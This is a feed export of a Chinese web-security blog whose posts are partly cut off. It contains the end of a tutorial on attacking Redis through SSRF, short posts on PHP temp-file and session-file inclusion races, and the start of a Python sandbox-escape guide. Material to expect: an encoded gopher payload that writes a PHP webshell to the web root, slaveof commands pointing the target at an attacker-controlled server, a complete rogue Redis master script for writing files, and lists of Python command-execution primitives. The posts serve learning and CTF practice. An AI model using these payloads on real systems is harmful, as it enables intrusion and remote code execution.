start="2"><li>对数据体URL编码后发给目标</li></ol><p><code>?url=gopher://127.0.0.1:6379/_%25244%250d%250aauth%250d%250a%25248%250d%250afoobared%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252422%250d%250a%253C%253F%253Deval(%2524_GET%255B911%255D)%253B%253F%253E%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252414%250d%250a%252Fvar%252Fwww%252Fhtml%252F%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25247%250d%250atmp.php%250d%250a*1%250d%250a%25246%250d%250abgsave</code></p><p>如果嫌麻烦也可以用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>交互式生成payload，同样需要二次编码后再打，<code>auth</code>开头的验证信息也要手动加一下</p><h2 id="主从同步数据"><a href="#主从同步数据" class="headerlink" title="主从同步数据"></a>主从同步数据</h2><p>将数据通过redis-cli写入VPS的Redis，让目标通过主从同步加载数据。</p><ol start="0"><li><p>在VPS上通过redis-cli写入数据</p></li><li><p>在目标上设置主从同步</p></li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><ol start="5"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p><p>脚本耦合度不高只要把一些主动打的功能删掉就可以了，然后利用SSRF手动发包即可。</p><ol start="0"><li>准备要无损写的文件，在VPS上执行脚本</li></ol><p><code>python3 ssrf-redis-writefile.py --lhost=1.1.1.1 --lport=6379 --lfile=test.txt</code></p><ol><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="2"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="3"><li>在目标上设置主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="4"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><p>如果要用过认证或者是希望一把梭打完，就抓下包封装下gopher协议，道理是一样的。</p><blockquote><p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加%00绕过<br>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系</p></blockquote><ul><li>附脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">CLRF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author: hosch3n</span></span><br><span class="line"><span class="string">Reference: https://github.com/r35tart/RedisWriteFile/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;*&quot;</span>):</span><br><span class="line">        raw_arr = cmd.strip().split(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> raw_arr[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;$&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> cmd.split(<span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">msg</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[1;32;40m[info]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">din</span>(<span class="params">sock, cnt=<span class="number">4096</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    msg = sock.recv(cnt)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;34;40m[-&gt;]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line">    <span class="keyword">return</span> msg.decode(<span class="string">&#x27;gb18030&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dout</span>(<span class="params">sock, msg</span>):</span></span><br><span class="line">    <span class="keyword">global</span> verbose</span><br><span class="line">    <span class="keyword">if</span> type(msg) != bytes:</span><br><span class="line">        msg = msg.encode()</span><br><span class="line">    sock.send(msg)</span><br><span class="line">    <span class="keyword">if</span> verbose:</span><br><span class="line">        <span class="keyword">if</span> len(msg) &lt; <span class="number">1000</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;&quot;</span>.format(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;\033[1;33;40m[&lt;-]\033[0m &#123;&#125;......&#123;&#125;&quot;</span>.format(msg[:<span class="number">80</span>], msg[<span class="number">-80</span>:]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RogueServer</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, lhost, lport</span>):</span></span><br><span class="line">        self._host = lhost</span><br><span class="line">        self._port = lport</span><br><span class="line">        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self._sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, self._port))</span><br><span class="line">        self._sock.listen(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self._sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        cmd_arr = decode_cmd(data)</span><br><span class="line">        resp = <span class="string">&quot;&quot;</span></span><br><span class="line">        phase = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PING&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+PONG&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;REPLCONF&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+OK&quot;</span> + CLRF</span><br><span class="line">            phase = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;PSYNC&quot;</span>) <span class="keyword">or</span> cmd_arr[<span class="number">0</span>].startswith(<span class="string">&quot;SYNC&quot;</span>):</span><br><span class="line">            resp = <span class="string">&quot;+FULLRESYNC &quot;</span> + <span class="string">&quot;Z&quot;</span>*<span class="number">40</span> + <span class="string">&quot; 1&quot;</span> + CLRF</span><br><span class="line">            resp += <span class="string">&quot;$&quot;</span> + str(len(payload)) + CLRF</span><br><span class="line">            resp = resp.encode()</span><br><span class="line">            resp += payload + CLRF.encode()</span><br><span class="line">            phase = <span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> resp, phase</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self</span>):</span></span><br><span class="line">        cli, addr = self._sock.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = din(cli, <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            resp, phase = self.handle(data)</span><br><span class="line">            dout(cli, resp)</span><br><span class="line">            <span class="keyword">if</span> phase == <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runserver</span>(<span class="params">lhost, lport</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rogue = RogueServer(lhost, lport)</span><br><span class="line">        rogue.exp()</span><br><span class="line">        sleep(<span class="number">3</span>)</span><br><span class="line">        rogue.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;\033[1;31;m[-]\033[0m 发生错误！ : &#123;&#125; \n[*] Exit..&quot;</span>.format(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lhost&quot;</span>, dest=<span class="string">&quot;lh&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server ip&quot;</span>, metavar=<span class="string">&quot;LOCAL_HOST&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lport&quot;</span>, dest=<span class="string">&quot;lp&quot;</span>, type=<span class="string">&quot;int&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;rogue server listen port, default 6379&quot;</span>, default=<span class="number">6379</span>,</span><br><span class="line">            metavar=<span class="string">&quot;LOCAL_PORT&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;--lfile&quot;</span>, dest=<span class="string">&quot;lfile&quot;</span>, type=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">            help=<span class="string">&quot;Local file that needs to be written&quot;</span>, metavar=<span class="string">&quot;Local_File_Name&quot;</span>, default=<span class="string">&#x27;dump.rdb&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--verbose&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">            help=<span class="string">&quot;Show full data stream&quot;</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">global</span> verbose, payload, filename</span><br><span class="line">    localfile = options.lfile</span><br><span class="line">    verbose = options.verbose</span><br><span class="line">    payload = open(localfile, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        runserver(options.lh, options.lp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        info(repr(e))</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA">一次“SSRF–&gt;RCE”的艰难利用</a></p><p><a href="https://www.anquanke.com/post/id/181599#h2-2">浅析SSRF认证攻击Redis</a></p><p><a href="http://r3start.net/index.php/2020/05/09/683">通过 SSRF 操作 Redis 主从复制写 Webshell</a></p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p><a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/">2020 GACTF web</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;用dict协议通过SSRF间接打Redis的时候，数据中存在&lt;code&gt;:&lt;/code&gt;、&lt;code&gt;&amp;#39;&lt;/code&gt;等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。&lt;/p&gt;
&lt;h2 id=&quot;位运算&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="redis" scheme="https://hosch3n.github.io/tags/redis/"/>
    
    <category term="bitop" scheme="https://hosch3n.github.io/tags/bitop/"/>
    
    <category term="slaveof" scheme="https://hosch3n.github.io/tags/slaveof/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含临时文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T09:54:48.000Z</published>
    <updated>2021-03-01T09:43:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在<code>$_FILES</code>变量中找到（通常为<code>/tmp/php[六个随机字符]</code>），通过phpinfo页面可以读到<code>$_FILES</code>。</p><p>一般的请求等获取到phpinfo中的文件名时已经结束了，此时可控的临时文件就已经被删掉了，但由于phpinfo中<code>$_FILES[file][tmp_name]</code>比其它HTTP头先输出，因此可以在HTTP头中发送大量无用数据，读到临时文件名后立即利用文件包含执行代码，通过条件竞争抢到临时文件被删除前时间窗口。</p><p><img src="/img/phpbhlswj_a.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;即使PHP后端不是处理文件上传的代码，在收到上传文件数据时同样会创建缓存文件，文件名可以在&lt;code&gt;$_FILES&lt;/code&gt;变量中找到（通常为&lt;code&gt;/tmp/php[六个随机字符]&lt;/code&gt;），通过phpinfo页面可以读到&lt;code&gt;$_FILES&lt;/co</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="lfi" scheme="https://hosch3n.github.io/tags/lfi/"/>
    
    <category term="tmp" scheme="https://hosch3n.github.io/tags/tmp/"/>
    
  </entry>
  
  <entry>
    <title>PHP包含Session文件</title>
    <link href="https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/"/>
    <id>https://hosch3n.github.io/2020/09/04/PHP%E5%8C%85%E5%90%ABSession%E6%96%87%E4%BB%B6/</id>
    <published>2020-09-04T06:35:12.000Z</published>
    <updated>2021-03-01T09:44:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>PHP的<code>session.save_path</code>配置指定了session文件的结构深度、文件权限、存放路径，格式为<code>N;MODE;/path</code>。<code>N</code>表示子文件夹划分深度，<code>MODE</code>表示文件的umask值（默认为600），<code>path</code>通常为<code>/var/lib/php/sessions</code>或<code>/tmp</code>。</p><p>PHP在大文件流式上传时，为了将上传进度存放在session中，如果不存在session则会自动初始化，直到文件上传结束后销毁（由<code>session.upload_progress.cleanup</code>指定）。当<code>session.upload_progress.enabled</code>为默认值1时，上传文件的同时传递<code>name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</code>即可利用（由<code>session.upload_progress.name</code>指定）</p><p><code>session.name</code>通常为<code>PHPSESSID</code>，用作Cookie的键名。当<code>session.use_strict_mode</code>为默认值0时，客户端可以自定义sessionID，即通过Cookie传递<code>PHPSESSID=hosch3n</code>后，服务器将创建对应的<code>sess_hosch3n</code>文件。</p><p>因此就可以在利用文件上传自动初始化session的同时自定义sessionID，并利用条件竞争在文件上传完成前通过文件包含实现代码执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP的&lt;code&gt;session.save_path&lt;/code&gt;配置指定了session文件的结构深度、文件权限、存放路径，格式为&lt;code&gt;N;MODE;/path&lt;/code&gt;。&lt;code&gt;N&lt;/code&gt;表示子文件夹划分深度，&lt;code&gt;MODE&lt;/code&gt;表示</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="lfi" scheme="https://hosch3n.github.io/tags/lfi/"/>
    
    <category term="session" scheme="https://hosch3n.github.io/tags/session/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</id>
    <published>2020-08-27T13:02:57.000Z</published>
    <updated>2021-03-01T09:43:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>Python沙箱逃逸指的是：突破原本受限的Python交互环境，实现执行命令、读写文件等操作。</p><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p><p>因此除了常用方式，还可以通过手动添加、直接执行等方式导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;xxx&#x27;</span>]=<span class="string">&#x27;blacklist&#x27;</span></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;xxx&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line">exec(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="危险方法"><a href="#危险方法" class="headerlink" title="危险方法"></a>危险方法</h3><p>有很多模块和方法可以用于执行命令或者读取文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">commands.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, number=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">bdb.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cgi.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line">importlib.__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pickle.loads(<span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span>)</span><br><span class="line"></span><br><span class="line">eval(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line">exec(compile(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">pty.spawn(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">pty.os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件操作</span></span><br><span class="line">open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">linecache.getlines(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line">codecs.open(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">file(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">types.FileType(<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br><span class="line">commands.getstatus(<span class="string">&#x27;.bash_history&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数参数</span></span><br><span class="line">foo.__code__.co_argcount</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_argcount</span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数字节码</span></span><br><span class="line">foo.__code__.co_code</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">foo.func_code.co_code</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="重新导入"><a href="#重新导入" class="headerlink" title="重新导入"></a>重新导入</h2><p>Python将一些经常用到的函数放在了<code>内建模块</code>中，这些函数无需导入即可使用（比如<code>eval</code>、<code>open</code>），这个内建模块在Python2中叫作<code>__builtin__</code>、在Python3中叫作<code>builtins</code>，这两个都需要导入才可以引用，但可以通过<code>__builtins__</code>来间接引用而无需导入（有一点区别，但问题不大）。</p><p>一些环境出于安全考虑会删掉<code>内建模块</code>中的危险方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;exec&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;getattr&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> 